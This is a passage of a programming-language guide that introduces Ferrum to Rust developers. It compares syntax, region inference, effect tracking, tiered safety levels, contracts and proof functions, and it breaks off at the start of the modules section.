# Ferrum for Rust Programmers

**Audience:** Experienced Rust developers learning Ferrum

You already understand ownership, borrowing, lifetimes, traits, and why they matter. Ferrum shares these foundations — you won't need to relearn them. This guide focuses on what's different: where Ferrum changes syntax, where it adds features Rust doesn't have, and where it makes different tradeoffs.

---

## The Short Version

If you're impatient, here's Ferrum in 30 seconds:

```ferrum
// Ferrum
fn process[T: Display](items: &[T]): Result[usize, Error] ! IO {
    for item in items {
        println("{}", item)
    }
    Ok(items.len())
}
```

```rust
// Rust equivalent
fn process<T: Display>(items: &[T]) -> Result<usize, Error> {
    for item in items {
        println!("{}", item);
    }
    Ok(items.len())
}
```

Key differences visible here:
- `[T]` not `<T>` for generics
- `:` not `->` for return types
- `! IO` declares effects (Ferrum tracks IO in the type system)
- No semicolons (optional, usually omitted)
- `println()` not `println!()` (compiler intrinsic, not a macro)

Now let's go deeper.

---

## Syntax Changes

These are mechanical — your fingers will adapt in a day.

### Generics: Square Brackets

```rust
// Rust
fn map<T, U, F>(opt: Option<T>, f: F) -> Option<U>
where
    F: FnOnce(T) -> U
```

```ferrum
// Ferrum
fn map[T, U, F](opt: Option[T], f: F): Option[U]
where
    F: FnOnce(T): U
```

**Why the change:** `<>` creates parsing ambiguity with comparison operators. Every language that uses `<>` for generics has grammar complications. Square brackets don't.

```ferrum
// Unambiguous in Ferrum
let x = a < b && c > d       // comparisons
let y: Vec[i32] = Vec.new()  // generic
```

In Rust, the parser needs context to distinguish `foo<bar, baz>(x)` (generic function call) from `foo < bar, baz > (x)` (two comparisons and a tuple). Rust solves this with the "turbofish" (`::<>`) syntax. Ferrum's rule is simpler: `expr[...]` in expression position is always indexing. Type parameters at call sites are always inferred — never written explicitly. When inference needs help, annotate the binding instead:

```ferrum
let x: i32 = "42".parse()?   // inferred from binding annotation
```

### Paths: Dots Instead of Double Colon

```rust
// Rust
use std::collections::HashMap;
let map = HashMap::<String, i32>::new();
std::io::stdout().write_all(b"hello")?;
```

```ferrum
// Ferrum
import std.collections.HashMap
let map = HashMap[String, i32].new()
std.io.stdout().write_all(b"hello")?
```

**Why:** `::` is two characters for no benefit. Every other mainstream language uses `.` for namespacing. There's no ambiguity — the parser knows whether you're accessing a module member or a struct field from context.

### Attributes: @ Instead of #[]

```rust
// Rust
#[derive(Debug, Clone)]
#[repr(C)]
struct Point {
    x: f64,
    y: f64,
}
```

```ferrum
// Ferrum
@derive(Debug, Clone)
@repr(C)
struct Point {
    x: f64,
    y: f64,
}
```

**Why:** Slightly cleaner, one less bracket pair. Also `@` reads as "at" which suggests metadata/annotation. This is consistent with Python, Java, and other languages that use `@` for decorators/annotations.

### Return Types: Colon

```rust
// Rust
fn foo() -> i32 { 42 }
fn bar() -> Result<String, Error> { Ok("hello".into()) }
```

```ferrum
// Ferrum
fn foo(): i32 { 42 }
fn bar(): Result[String, Error] { Ok("hello".into()) }
```

**Why:** Consistency with variable declarations (`let x: i32`). The arrow `->` is reserved for closure types, eliminating another source of visual noise.

### No Semicolons (Usually)

```ferrum
fn example() {
    let x = 5
    let y = 10
    println("sum = {}", x + y)
}
```

Semicolons are optional statement terminators. You can use them if you want, but idiomatic Ferrum omits them. The grammar is designed to be unambiguous without them.

**When you need semicolons:** To suppress the value of an expression when you want the block to return unit:

```ferrum
fn returns_unit() {
    compute_something();  // semicolon discards the return value
}
```

### No User-Defined Macros

Rust's `println!`, `vec!`, `format!` are macros. In Ferrum, these are **compiler intrinsics**:

```ferrum
// Compiler intrinsics, not macros
println("Hello, {}!", name)
let v = vec(1, 2, 3, 4, 5)
let s = format("Value: {}", x)
```

**Ferrum has no user-defined macros.** No `macro_rules!`, no proc macros, no compile-time code execution.

**Why?** Two reasons:

1. **Security.** Rust proc macros execute arbitrary code at compile time. When you `cargo build` a project with dependencies, you're running code from the internet on your machine. This is a supply chain attack vector. Ferrum doesn't have this problem — building untrusted code can't execute arbitrary code. (Note: Ferrum's `proof fn` is not equivalent — proof functions operate in a constrained logical sublanguage, are verified by the compiler rather than executed, and are erased before the binary is produced. See [Introduction to Proofs](ferrum-introduction-to-proofs.md).)

2. **Simplicity.** Macros are notoriously hard to debug, produce confusing error messages, and make code harder to read. In Ferrum, code is what it looks like — no hidden expansions.

**What Ferrum provides instead:**

| Need | Ferrum solution |
|------|-----------------|
| `println`, `format`, `vec` | Compiler intrinsics (not extensible) |
| `@derive(Debug, Clone)` | Compiler built-in for fixed trait set |
| DSLs (`html!`, `sql!`) | Use strings + runtime parsing, or external codegen |
| Boilerplate reduction | Write the code, or use external tools |

**Derivable traits are fixed by the compiler:** `Debug`, `Clone`, `Copy`, `Eq`, `PartialEq`, `Ord`, `PartialOrd`, `Hash`, `Default`.

Want custom serialization? Write the impl. Want code generation? Use an external tool that runs *before* the compiler, not *inside* it.

---

## Lifetimes: Inferred, Not Annotated

This is the biggest ergonomic difference. In Rust, you spend significant time thinking about lifetimes. In Ferrum, you usually don't.

### The Problem with Rust Lifetimes

Consider this common Rust pattern:

```rust
// Rust: A parser that borrows its input
struct Parser<'input> {
    source: &'input str,
    position: usize,
}

impl<'input> Parser<'input> {
    fn new(source: &'input str) -> Parser<'input> {
        Parser { source, position: 0 }
    }

    fn peek(&self) -> Option<&'input str> {
        self.source.get(self.position..self.position + 1)
    }

    fn advance(&mut self) -> Option<&'input str> {
        let c = self.peek()?;
        self.position += c.len();
        Some(c)
    }
}

fn parse_all<'a, 'b>(parser: &'a mut Parser<'b>, limit: usize) -> Vec<&'b str> {
    let mut results = Vec::new();
    for _ in 0..limit {
        if let Some(c) = parser.advance() {
            results.push(c);
        }
    }
    results
}
```

Every `'input` annotation is noise. The compiler already knows that the parser's references must live as long as its source. The annotations tell the compiler something it can figure out — they don't convey information to human readers that isn't already obvious from the code structure.

### Ferrum: Region Inference

```ferrum
struct Parser {
    source: &str,
    position: usize,
}

impl Parser {
    fn new(source: &str): Parser {
        Parser { source, position: 0 }
    }

    fn peek(&self): Option[&str] {
        self.source.get(self.position..self.position + 1)
    }

    fn advance(&mut self): Option[&str] {
        let c = self.peek()?
        self.position += c.len()
        Some(c)
    }
}

fn parse_all(parser: &mut Parser, limit: usize): Vec[&str] {
    let mut results = Vec.new()
    for _ in 0..limit {
        if let Some(c) = parser.advance() {
            results.push(c)
        }
    }
    results
}
```

**How region inference works:**

1. The compiler assigns a fresh region variable to every reference in a function signature.
2. It generates constraints from the function body — assignments, returns, field accesses.
3. It solves constraints to find the smallest valid region for each variable.
4. It reports an error only if no solution exists.

For the `Parser` example, the compiler infers:
- The `source` field's region equals the region of the `&str` passed to `new()`
- The return type of `peek()` has the same region as `source`
- The return type of `parse_all()` has the same region as the parser's `source`

This is exactly what Rust's lifetime annotations would say — the compiler just doesn't require you to write it out.

### Complex Lifetime Scenarios: Before and After

Here are several examples where Rust requires explicit lifetimes and how they look in Ferrum.

**Example 1: Iterator returning references to self**

```rust
// Rust
struct Lines<'a> {
    remaining: &'a str,
}

impl<'a> Iterator for Lines<'a> {
    type Item = &'a str;

    fn next(&mut self) -> Option<Self::Item> {
        if self.remaining.is_empty() {
            return None;
        }
        let end = self.remaining.find('\n').unwrap_or(self.remaining.len());
        let line = &self.remaining[..end];
        self.remaining = &self.remaining[end..].trim_start_matches('\n');
        Some(line)
    }
}

fn lines<'a>(s: &'a str) -> Lines<'a> {
    Lines { remaining: s }
}
```

```ferrum
// Ferrum
struct Lines {
    remaining: &str,
}

impl Lines: Iterator {
    type Item = &str

    fn next(&mut self): Option[Self.Item] {
        if self.remaining.is_empty() {
            return None
        }
        let end = self.remaining.find('\n').unwrap_or(self.remaining.len())
        let line = &self.remaining[..end]
        self.remaining = &self.remaining[end..].trim_start_matches('\n')
        Some(line)
    }
}

fn lines(s: &str): Lines {
    Lines { remaining: s }
}
```

The constraints are the same. The compiler infers that `Lines::Item` must have the same region as the original `&str`. No annotation needed.

**Example 2: Multiple input lifetimes**

```rust
// Rust: Which input does the return reference come from?
fn first_word<'a>(s: &'a str) -> &'a str {
    s.split_whitespace().next().unwrap_or(s)
}

// When there are multiple inputs, you must be explicit:
fn longer<'a>(x: &'a str, y: &'a str) -> &'a str {
    if x.len() > y.len() { x } else { y }
}
```

```ferrum
// Ferrum: Inference handles both cases
fn first_word(s: &str): &str {
    s.split_whitespace().next().unwrap_or(s)
}

fn longer(x: &str, y: &str): &str {
    if x.len() > y.len() { x } else { y }
}
// Inferred: return region = min(region(x), region(y))
```

For `longer`, the compiler infers that the return could come from either input, so the return's region is the intersection (minimum) of both input regions. This is exactly what Rust's elision rules would do if they applied here, but Rust requires explicit annotation. Ferrum's inference is more powerful.

**Example 3: Struct with multiple borrowed fields**

```rust
// Rust: Complex lifetimes when borrowing from different sources
struct Context<'db, 'req> {
    database: &'db Database,
    request: &'req Request,
}

impl<'db, 'req> Context<'db, 'req> {
    fn new(database: &'db Database, request: &'req Request) -> Context<'db, 'req> {
        Context { database, request }
    }

    fn query(&self) -> QueryResult<'db> {
        self.database.query(&self.request.query)
    }
}
```

```ferrum
// Ferrum: Still inferred
struct Context {
    database: &Database,
    request: &Request,
}

impl Context {
    fn new(database: &Database, request: &Request): Context {
        Context { database, request }
    }

    fn query(&self): QueryResult {
        self.database.query(&self.request.query)
    }
}
```

The compiler tracks that `database` and `request` have independent regions and infers the relationships correctly.

### When Inference Fails

Region inference doesn't always succeed. When the function signature is genuinely ambiguous — when a human reader also couldn't determine the relationship without more information — you need annotations.

```ferrum
// Ambiguous: does the return borrow from x, y, or either?
// The function body could be implemented different ways
fn choose[T]<'a, 'b>(x: &'a T, y: &'b T, use_x: bool): &'a T
    where 'b: 'a    // 'b outlives 'a
{
    if use_x { x } else { y as &'a T }
}
```

These cases are rare — roughly 10% of functions that need lifetime annotations in Rust. When you do need them, the syntax is similar to Rust's.

### The Design Philosophy

Ferrum's position is that most lifetime annotations in Rust are **incidental complexity** — they tell the compiler something it can figure out, and they don't help human readers understand code better. The annotations that remain after inference are **essential complexity** — they convey genuinely ambiguous relationships that a reader needs to understand.

The compiler warns when you write redundant annotations:

```
warning: redundant region annotation
  --> src/parser.fe:47:5
   |
47 |     fn peek<'a>(&'a self): Option[&'a str]
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |     region inference verifies this automatically
   |
   = note: `ferrum fix --remove-redundant` to clean up
```

---

## Effects: Tracked in the Type System

This is a feature Rust doesn't have. Effects make function signatures honest about what the function actually does.

### The Problem Effects Solve

In Rust, these functions have the same signature:

```rust
fn compute(x: i32) -> i32 {
    x * 2
}

fn compute_with_logging(x: i32) -> i32 {
    println!("computing...");  // IO!
    x * 2
}

fn compute_with_network(x: i32) -> i32 {
    reqwest::blocking::get("https://telemetry.example.com/ping");  // Network!
    x * 2
}

fn compute_with_panic(x: i32) -> i32 {
    assert!(x >= 0);  // Might panic!
    x * 2
}
```

You can't tell from the signature which one does IO, which one touches the network, which one might panic. You have to read the implementation. When you call a library function, you're trusting that it doesn't secretly:
- Log sensitive data
- Phone home with telemetry
- Read environment variables
- Panic on edge cases

### Ferrum: Effects in Signatures

```ferrum
fn compute(x: i32): i32 {
    x * 2
}

fn compute_with_logging(x: i32): i32 ! IO {
    println("computing...")
    x * 2
}

fn compute_with_network(x: i32): i32 ! Net + IO {
    http.get("https://telemetry.example.com/ping")
    x * 2
}

fn compute_with_panic(x: i32): i32 ! Panic {
    assert(x >= 0)
    x * 2
}
```

The effects are part of the function's type. A function without `!` is pure — the compiler enforces this. You can't call an impure function from a pure function:

```ferrum
fn pure_function(x: i32): i32 {
    compute_with_logging(x)  // ERROR: cannot perform IO in pure context
}
```

### Effect Types

| Effect | Meaning | Examples |
|--------|---------|----------|
| `IO` | File, console, environment access | `println`, `fs.read`, `env.var` |
| `Net` | Network operations | `http.get`, `TcpStream.connect` |
| `Async` | Can suspend/await | Any async operation |
| `Alloc[A]` | Allocates memory | `Vec.new`, `Box.new` |
| `Panic` | Might panic | `assert`, `unwrap` |
| `Unsafe` | Does something the compiler can't verify | Raw pointer ops |

Combine with `+`:

```ferrum
pub fn download_and_save(url: &str, path: &str): Result[(), Error] ! Net + IO {
    let data = http.get(url)?
    fs.write(path, &data)?
    Ok(())
}
```

### Practical Examples of Effect Tracking

- **Example 1: Library trust**

  You're evaluating a logging library. In Rust:

  ```rust
  // From the signature alone, you have no idea what this does
  pub fn log(level: Level, message: &str);
  ```

  In Ferrum:

  ```ferrum
  // This library just does file IO
  pub fn log(level: Level, message: &str) ! IO

  // This library does network (suspicious for a logger!)
  pub fn log(level: Level, message: &str) ! IO + Net

  // This logger is pure (writes to an in-memory buffer)
  pub fn log(level: Level, message: &str)
  ```

  Effects tell you immediately if a library does something unexpected.

- **Example 2: Sandboxing untrusted code**

  ```ferrum
  // Run a plugin with restricted capabilities
  fn run_plugin(plugin: &Plugin, input: &[u8]): Vec[u8] {
      // Plugin cannot do IO or Net — compiler enforces this
      plugin.process(input)
  }
  ```

  If `Plugin::process` tries to call an `IO` function, compilation fails. You don't need runtime sandboxing for this — the type system prevents it.

- **Example 3: Reasoning about parallelism**

  ```ferrum
  // Compiler knows these can safely run in parallel
  fn process_batch(items: &[Item]): Vec[Output] {
      items.par_iter()
           .map(|item| transform(item))  // transform is pure
           .collect()
  }
  ```

  If `transform` had effects, the compiler would require you to think about ordering. Pure functions can be parallelized automatically.

- **Example 4: Testing without mocks**

  ```ferrum
  // Pure functions don't need mocks — they just compute
  fn calculate_tax(income: u64, brackets: &[Bracket]): u64 {
      // Pure computation
  }

  @test
  fn test_calculate_tax() {
      // No mock setup needed, no IO stubs
      assert_eq(calculate_tax(50_000, &STANDARD_BRACKETS), 7_500)
  }
  ```

  Pure functions are trivially testable. Effect tracking tells you which functions need test infrastructure and which don't.

### You Don't Write Effects Everywhere

Effects are **inferred within modules** and **required at `pub` boundaries**:

```ferrum
// Private function — effects inferred, no annotation needed
fn helper(x: i32): i32 {
    println("debug: {}", x)  // compiler infers ! IO
    x * 2
}

// Public function — must declare effects
pub fn api_function(x: i32): i32 ! IO {
    helper(x)
}
```

This means internal code looks like regular Rust. Effects only appear in your public API, where they serve as documentation and contract.

If you forget to annotate a public function, the compiler tells you:

```
error: public function `api_function` has undeclared effects
  --> src/lib.fe:15:1
   |
15 | pub fn api_function(x: i32): i32 {
   |        ^^^^^^^^^^^^
   |
   = inferred effects: IO
   = help: add `! IO` to the signature
```

### Effect Polymorphism

Higher-order functions can be polymorphic over effects:

```ferrum
fn map[T, U](f: fn(T): U ! ?Eff, items: &[T]): Vec[U] ! ?Eff {
    items.iter().map(f).collect()
}
```

The `?Eff` effect variable means "whatever effects `f` has, `map` has too." If you pass a pure function, you get a pure `map`. If you pass an `IO` function, you get an `IO` `map`. Effect variables are declared by use — any identifier prefixed with `?` in an effect position is an effect variable, inferred from the argument types at each call site.

This is how standard library functions like `map`, `filter`, and `fold` work — they're effect-polymorphic, so they don't artificially restrict what closures you can pass.

### The Tradeoffs

**Cost:** You must annotate public function effects. This is similar to how Rust requires you to annotate `async` functions, but for all side effects.

**Benefit:** You can trust function signatures. A pure function stays pure. An `IO`-only function doesn't suddenly start doing network calls. Your security audits can focus on functions with dangerous effects.

---

## Safety Levels: Four, Not One

Rust has one escape hatch: `unsafe`. Ferrum has four levels, because not all unsafe operations are equally dangerous or require the same auditing attention.

### Why This Matters

Consider these Rust `unsafe` blocks:

```rust
// Skip a bounds check for performance
unsafe { slice.get_unchecked(index) }

// Internal data structure invariant maintenance
unsafe {
    self.header.len = new_len;
    ptr::copy_nonoverlapping(src, dst, count);
}

// Call a C library function
unsafe { libc::write(fd, buf.as_ptr(), len) }

// Raw pointer manipulation
unsafe { *raw_ptr = value }
```

These have very different risk profiles:
- The bounds check skip is low-risk if you've verified the index
- The invariant maintenance requires local reasoning about the data structure
- The FFI call depends entirely on the foreign library's correctness
- The raw pointer write could corrupt arbitrary memory

But Rust treats them identically. When auditing unsafe code, you can't grep for "the dangerous ones" — every `unsafe` block requires full attention.

### The Four Levels

| Level | Keyword | What it relaxes | Audit priority |
|-------|---------|-----------------|----------------|
| 0 | (default) | Nothing. Full checker, all guarantees. | N/A |
| 1 | `unchecked` | Bounds checks, arithmetic overflow | Low — logic errors, not memory |
| 2 | `trusted` | Named assertions the compiler can't verify | Medium — local reasoning |
| 3 | `extern` | FFI boundary | High — foreign code behavior |
| 4 | `unsafe` | Raw pointers, arbitrary memory | Highest — memory safety |

### Level 1: `unchecked` — Skip Runtime Checks

`unchecked` skips runtime checks that can't cause memory unsafety — just incorrect results or panics.

```ferrum
fn sum_unchecked(data: &[u32]): u32 {
    let mut total: u32 = 0
    for i in 0..data.len() {
        // Skip bounds check — we know i < data.len()
        unchecked { total += *data.get_unchecked(i) }
    }
    total
}

fn fast_average(data: &[u32]): u32
    requires data.len() > 0
{
    // Skip division-by-zero check — precondition guarantees len > 0
    unchecked { sum_unchecked(data) / data.len() as u32 }
}
```

**What you can do in `unchecked`:**
- Skip bounds checks (`get_unchecked`, `get_unchecked_mut`)
- Skip arithmetic overflow checks
- Skip other runtime assertions

**What you cannot do:** Nothing that affects memory safety. No raw pointers, no FFI.

**Audit guideline:** `unchecked` blocks are optimization. Verify the invariant that makes the check unnecessary. If the invariant breaks, you get a logic bug or panic, not memory corruption.

### Level 2: `trusted` — Assert What the Compiler Can't Verify

`trusted` makes named assertions about properties the compiler cannot check. The assertion string is part of the audit trail.

```ferrum
trusted("ptr is valid for len bytes, properly aligned, no aliasing references")
trusted("len does not exceed isize.MAX")
fn from_raw_parts[T](ptr: *const T, len: usize): &[T] {
    // Implementation that assumes the caller upheld these contracts
    unsafe { core.slice.from_raw_parts(ptr, len) }
}
```

The assertions are structured and machine-readable. The `ferrum audit` command extracts them:

```
$ ferrum audit src/ --level trusted

src/slice.fe:47   trusted  "ptr valid for len bytes, aligned, no aliasing"
src/slice.fe:48   trusted  "len does not exceed isize.MAX"
src/arena.fe:112  trusted  "offset within bounds, no arithmetic overflow"
src/io.fe:203     trusted  "fd is valid and open"
```

**When to use `trusted`:**
- Documenting why an operation is safe
- Wrapping `unsafe` with a clear safety contract
- Internal invariant maintenance where you know more than the compiler

**Audit guideline:** Each `trusted` assertion is a claim you must verify holds at every call site. The assertion tells you exactly what to check.

### Level 3: `extern` — FFI Boundaries

`extern` marks calls to foreign code. The Ferrum type checker verifies the types on the Ferrum side; the foreign code's behavior is unknown.

```ferrum
extern(c) {
    fn strlen(s: *const u8): usize
    fn memcpy(dst: *mut u8, src: *const u8, n: usize): *mut u8
    fn malloc(size: usize): *mut u8
    fn free(ptr: *mut u8)
}

fn safe_wrapper(s: &str): usize {
    // extern block required for FFI call
    extern { strlen(s.as_ptr()) }
}
```

**Audit guideline:** `extern` blocks require reviewing the foreign library's documentation and behavior. The risk depends entirely on what the external code does.

### Level 4: `unsafe` — Full Manual Control

`unsafe` provides raw pointer access and manual memory control. This is where memory safety becomes your responsibility.

```ferrum
unsafe fn swap_bytes(a: *mut u8, b: *mut u8) {
    let tmp = *a
    *a = *b
    *b = tmp
}

fn example() {
    let mut x: u8 = 1
    let mut y: u8 = 2

    unsafe {
        swap_bytes(&mut x as *mut u8, &mut y as *mut u8)
    }
}
```

**Audit guideline:** `unsafe` blocks require line-by-line analysis for memory safety. These are the highest-priority audit targets.

### Practical Example: A Safe Abstraction

Here's how the safety levels work together in a real abstraction — a fixed-capacity array buffer:

```ferrum
struct ArrayBuf[T, const N: usize] {
    data: [MaybeUninit[T]; N],
    len: usize,

    invariant self.len <= N
}

impl ArrayBuf[T, const N: usize] {
    fn new(): Self {
        Self {
            data: MaybeUninit.uninit_array(),
            len: 0,
        }
    }

    fn push(&mut self, value: T): Result[(), T]
        requires self.len <= N
        ensures result.is_ok() implies self.len == old(self.len) + 1
    {
        if self.len >= N {
            return Err(value)
        }

        // unchecked: we just verified len < N
        unchecked {
            self.data.get_unchecked_mut(self.len).write(value)
        }
        self.len += 1
        Ok(())
    }

    fn get(&self, index: usize): Option[&T] {
        if index >= self.len {
            None
        } else {
            // unchecked: we just verified index < len
            // trusted: all elements 0..len are initialized
            trusted("elements 0..len are initialized") {
                Some(unsafe { self.data.get_unchecked(index).assume_init_ref() })
            }
        }
    }

    fn clear(&mut self) {
        // trusted: we're dropping all initialized elements
        trusted("dropping elements 0..len which are initialized") {
            for i in 0..self.len {
                unsafe {
                    self.data.get_unchecked_mut(i).assume_init_drop()
                }
            }
        }
        self.len = 0
    }
}
```

The audit report shows:

```
$ ferrum audit src/arraybuf.fe

src/arraybuf.fe:32  unchecked   (bounds check skip, len < N verified)
src/arraybuf.fe:44  trusted     "elements 0..len are initialized"
src/arraybuf.fe:55  trusted     "dropping elements 0..len which are initialized"
```

An auditor can:
- Ignore the `unchecked` (just a bounds check skip, logic error at worst)
- Verify each `trusted` assertion locally (check the struct's invariant is maintained)
- Focus attention on any `unsafe` blocks within the `trusted` sections

---

## Contracts: requires/ensures/invariant

Ferrum has built-in design-by-contract. Contracts are part of the type system, not just documentation that can drift out of sync.

### Preconditions and Postconditions

```ferrum
fn binary_search[T: Ord](arr: &[T], target: &T): Option[usize]
    requires arr.is_sorted()
    ensures match result {
        Some(i) => arr[i] == *target,
        None => !arr.contains(target),
    }
{
    // implementation
}
```

**`requires`** — precondition. The caller's obligation. Calling with an unsorted array is a bug in the *caller*.

**`ensures`** — postcondition. The implementer's obligation. If the function returns `Some(i)` but `arr[i] != *target`, that's a bug in the *implementation*.

### What Contracts Buy You

- **Example 1: Documenting and enforcing API contracts**

  ```ferrum
  fn pop[T](stack: &mut Vec[T]): T
      requires stack.len() > 0
      ensures stack.len() == old(stack.len()) - 1
  {
      // No need for Option — precondition handles empty case
      stack.remove(stack.len() - 1)
  }

  // Caller must ensure precondition
  fn process(items: &mut Vec[Item]) {
      if items.is_empty() {
          return
      }
      let last = pop(items)  // OK: we checked emptiness
      handle(last)
  }

  fn buggy_process(items: &mut Vec[Item]) {
      let last = pop(items)  // ERROR: cannot prove items.len() > 0
      handle(last)
  }
  ```

  The `requires` clause generates a runtime check in both debug and release builds. A violated precondition aborts with a message naming the caller's bug.

- **Example 2: Catching off-by-one errors**

  ```ferrum
  fn get_range[T](arr: &[T], start: usize, end: usize): &[T]
      requires start <= end
      requires end <= arr.len()
      ensures result.len() == end - start
  {
      &arr[start..end]
  }
  ```

  The postcondition `result.len() == end - start` catches a common bug: if you accidentally wrote `end - start + 1`, the contract would fail.

- **Example 3: Loop invariants for complex algorithms**

  ```ferrum
  fn partition[T: Ord](arr: &mut [T], pivot: usize): usize
      requires pivot < arr.len()
      ensures result <= arr.len()
      ensures forall i in 0..result => arr[i] <= arr[result]
      ensures forall i in result+1..arr.len() => arr[i] >= arr[result]
  {
      let pivot_val = arr[pivot]
      // ... partitioning logic ...
  }
  ```

  The postconditions precisely specify what partitioning means. If the implementation doesn't achieve this, tests catch it. In proof mode, the compiler verifies it statically.

### Struct Invariants

```ferrum
struct SortedVec[T: Ord] {
    inner: Vec[T],
}
invariant self.inner.windows(2).all(|w| w[0] <= w[1])

impl SortedVec[T: Ord] {
    fn new(): Self {
        SortedVec { inner: Vec.new() }
    }

    fn push(&mut self, value: T) {
        let pos = self.inner.binary_search(&value).unwrap_or_else(|i| i)
        self.inner.insert(pos, value)
        // invariant automatically checked here in debug builds
    }

    fn contains(&self, value: &T): bool {
        self.inner.binary_search(value).is_ok()
    }
}
```

The invariant is checked at the end of every `pub` method in debug builds. If `push` had a bug that broke sorting, you'd catch it immediately.

### Comparing to Rust

In Rust, you'd write:

```rust
/// Binary search over a sorted slice.
///
/// # Preconditions
/// - `arr` must be sorted in ascending order
///
/// # Returns
/// - `Some(index)` where `arr[index] == target`
/// - `None` if target is not in `arr`
fn binary_search<T: Ord>(arr: &[T], target: &T) -> Option<usize> {
    // ...
}
```

Problems:
1. Comments aren't checked — they can drift out of sync with the implementation
2. Nothing stops you from passing an unsorted array
3. The postcondition isn't machine-verifiable
4. When the code changes, nobody updates the comments

You might reach for a runtime assertion:

```rust
fn binary_search<T: Ord>(arr: &[T], target: &T) -> Option<usize> {
    debug_assert!(arr.windows(2).all(|w| w[0] <= w[1]), "array must be sorted");
    // ...
}
```

But this:
- Doesn't distinguish caller's bug from implementation bug
- Doesn't describe the postcondition at all
- Is ad-hoc, not part of a systematic approach
- Doesn't enable static verification

Ferrum contracts are a first-class language feature with two enforcement modes:
- **Unproven contracts:** Runtime assertions in both debug and release builds — violations abort with a diagnostic, never silently corrupt state
- **Proven contracts:** Static verification at compile time — no runtime check needed because the proof guarantees correctness for all inputs

### Runtime Behavior of Contracts

| Context | `requires` violation | `ensures` violation |
|---------|---------------------|---------------------|
| Debug build | Panic at call site, message names the caller's bug | Panic at return site, message names implementation bug |
| Release build | Same as debug — panic at call site | Same as debug — panic at return site |
| Proven (`proven_by`) | Compile error — must prove precondition holds | Compile error — must prove implementation correct |

For code you can **prove** correct, neither runtime checks nor trust are needed — the proof IS the verification.

---

## Proof Functions: SMT-Backed Verification

For properties the SMT solver can handle, Ferrum verifies contracts at compile time:

```ferrum
fn abs(x: i32): i32
    ensures result >= 0
    ensures result == x || result == -x
{
    if x >= 0 { x } else { -x }
}
// Compiler proves these postconditions hold for all x (except MIN)
```

The compiler generates verification conditions and sends them to Z3 or another SMT solver. Simple arithmetic properties like this are usually discharged automatically.

### When Automatic Verification Isn't Enough

For properties that need induction or complex reasoning, you write proof functions:

```ferrum
proof fn reverse_involutive[T](xs: &[T])
    ensures xs.reverse().reverse() == xs
{
    match xs {
        [] => {}  // base case: trivially true
        [head, ..tail] => {
            reverse_involutive(tail)  // inductive hypothesis
            // The proof checker verifies this is sufficient
        }
    }
}
```

**`proof fn`** compiles to nothing — it's erased after verification. It exists only to guide the SMT solver through inductive proofs.

### Linking Proofs to Implementations

Two annotations connect a fast implementation to a specification, at different levels of guarantee:

**`tested_by`** — the compiler calls both implementations in debug builds and asserts their outputs match. Catches behavioral divergence on inputs you actually run. No formal guarantee for untested inputs.

**`proven_by`** — you write a proof of equivalence. The compiler verifies it at compile time. Covers all inputs. Hard to write; use for crypto and safety-critical paths.

```ferrum
// Specification — correct by construction
proof fn sorted_insert_spec[T: Ord](xs: SortedVec[T], x: T): SortedVec[T]
    ensures result.len() == xs.len() + 1
    ensures result.is_sorted()
{
    let mut result = xs.clone()
    let pos = result.binary_search(&x).unwrap_or_else(|i| i)
    result.insert(pos, x)
    result
}

// Fast implementation with runtime equivalence checking (debug only)
fn sorted_insert[T: Ord](xs: SortedVec[T], x: T): SortedVec[T]
    tested_by(sorted_insert_spec)
{
    // optimized path — debug builds compare output against sorted_insert_spec
}

// Or: formal proof that the fast impl equals the spec for all inputs
proof fn sorted_insert_correct[T: Ord](xs: SortedVec[T], x: T):
    Prop[sorted_insert(xs, x) == sorted_insert_spec(xs, x)]
{ ... }

fn sorted_insert[T: Ord](xs: SortedVec[T], x: T): SortedVec[T]
    proven_by(sorted_insert_correct)
{
    // compiler has verified this is equivalent to the spec for all inputs
}
```

### When You Need This

**You need proof-level verification for:**
- Cryptographic implementations (must be correct, not "probably correct")
- Safety-critical systems (aerospace, medical devices)
- Financial calculations where bugs have legal consequences
- Security-critical code paths

**You don't need it for:**
- Most application code (contracts + tests are sufficient)
- Prototypes and scripts
- Code where incorrectness is annoying but not catastrophic

The proof system is opt-in. You can use Ferrum's contracts as runtime checks forever and never touch proofs. Proofs are for when "all my tests pass" isn't strong enough.

### The Four Levels of Correctness

| Level | Mechanism | Coverage | Who uses it |
|-------|-----------|----------|-------------|
| Types | Ownership, constrained types, `Option[T]` | Values the type system can represent | Everyone |
| Contracts | `requires`/`ensures`, SMT auto-discharge | Properties expressible as predicates | Library authors, careful code |
| Spec comparison | `tested_by(spec_fn)` | Inputs you actually run | Anyone with a reference impl |
| Formal proof | `proof fn` + `proven_by` | All inputs, mathematically | Crypto, safety-critical, high-assurance |

Most Ferrum code stops at level 2. `tested_by` is the practical step up when contracts aren't expressive enough. `proven_by` is for when untested inputs must also be correct.

---

## Allocators: Heap by Default

Rust requires threading allocators through generics:

```rust
fn process<A: Allocator>(data: Vec<u8, A>, allocator: A) -> Vec<u8, A> {
    // Every function in the call chain needs the allocator parameter
}
```

This is correct but verbose. Most code uses the global allocator and doesn't care.

### Ferrum: Implicit Heap, Explicit Override

```ferrum
// Uses Heap implicitly — the common case
fn process(data: Vec[u8]): Vec[u8] {
    let mut result = Vec.new()  // allocates with Heap
    // ...
    result
}

// Explicit allocator when needed
fn process_with_allocator[A: Allocator](data: Vec[u8, A]): Vec[u8, A]
    given A
{
    let mut result = Vec.new()  // uses capability A from `given`
    // ...
    result
}
```

The `given A` clause declares an implicit parameter — the allocator capability is threaded through automatically.

### Practical Example: Arena Allocation

```ferrum
fn parse_document(src: &str): Document {
    // Use an arena for all allocations during parsing
    with Arena.new() as alloc {
        let tokens = tokenize(src)    // uses Arena
        let ast = parse(tokens)        // uses Arena
        let doc = analyze(ast)         // uses Arena
        doc.into_owned()               // convert to Heap-allocated before leaving
    }  // Arena freed here, all at once
}
```

Everything inside the `with` block uses the arena. No explicit parameters needed — the `given` clause on library functions picks up the ambient allocator.

### Why Capabilities Instead of Type Parameters

Rust's approach makes the allocator part of the type: `Vec<u8, A>`. This has costs:

```rust
// Rust: allocator infects every generic
fn process<A: Allocator>(v: Vec<u8, A>) -> String<A> { ... }
fn process_more<A: Allocator>(s: String<A>) -> Result<Output<A>, Error<A>> { ... }
```

Ferrum separates the concerns:
- The type (`Vec[u8]`) describes what the value is
- The capability (`given A: Allocator`) describes context needed to operate on it

This keeps types simpler while still supporting custom allocators when needed.

---

## Modules: Different Organization

### No mod.rs

Rust's module system has two ways to declare a module:

```
src/
  foo.rs          # mod foo
  bar/
    mod.rs        # mod bar
    baz.rs        # mod bar::baz
```

Ferrum simplifies this:

